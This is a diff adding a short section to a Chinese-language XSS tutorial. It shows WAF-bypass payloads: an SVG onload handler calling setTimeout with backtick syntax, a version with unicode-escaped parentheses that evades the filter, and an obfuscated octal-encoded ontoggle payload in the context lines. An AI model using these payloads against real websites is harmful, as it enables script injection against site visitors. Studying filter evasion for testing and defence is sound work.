@@ -126,4 +126,20 @@ setTimeout()函数也是没问题的，毕竟也能执行代码。
 <details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')>
 ```
 
+## eval函数的补充
+- - -
+`setTimeout`比eval略眼熟，也是比较常见的。
+
+waf拦截
+```html
+<svg/onload=setTimeout`alert(1)`>
+```
+![17](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy2v7lvnj30uj05d74p.jpg)
+
+```html
+<svg/onload=setTimeout`alert\u0028233\u0029`>
+```
+![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy5mcdg4j30uj0813z5.jpg)
+
+
 
